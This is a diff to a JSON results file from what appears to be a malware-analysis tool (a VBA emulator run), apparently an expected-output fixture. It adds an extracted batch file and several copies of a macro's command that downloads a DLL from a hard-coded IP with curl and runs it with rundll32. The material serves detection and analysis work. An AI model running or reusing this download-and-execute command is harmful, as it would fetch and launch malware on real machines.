@@ -24,7 +24,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "Action: Start Regular Emulation, Parameters: ",
+        "body": "Action: Start Regular Emulation, No Parameters",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -44,8 +44,49 @@
         "depth": 1,
         "heuristic": null,
         "promote_to": null,
-        "tags": {},
+        "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "cmd.exe /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 && rundll32 fd.dll,N115', 6, 'wscript.shell']"
+              ]
+            }
+          }
+        },
         "title_text": "Interesting Function Call",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "curl -o fd.dll http://64.225.8.202/1Moch7/160223 && rundll32 fd.dll,N115', 6, 'wscript.shell']; See [b799fbd6bd.bat]",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 2,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Discovered command line commands in parameter.",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 9,
+          "score": 0,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Discovered command line commands in file",
         "zeroize_on_tag_safe": false
       },
       {
@@ -95,7 +136,12 @@
     ]
   },
   "files": {
-    "extracted": [],
+    "extracted": [
+      {
+        "name": "b799fbd6bd.bat",
+        "sha256": "5b18d59b08a990d78b22846e800a92a13b33f4395f0cf0162af2119e9e3c52b2"
+      }
+    ],
     "supplementary": [
       {
         "name": "vipermonkey_output.log",
@@ -109,9 +155,21 @@
         "attack_ids": [],
         "heur_id": 4,
         "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 9,
+        "signatures": []
       }
     ],
     "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "cmd.exe /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 && rundll32 fd.dll,N115', 6, 'wscript.shell']"
+        }
+      ],
       "network.static.ip": [
         {
           "heur_id": 4,
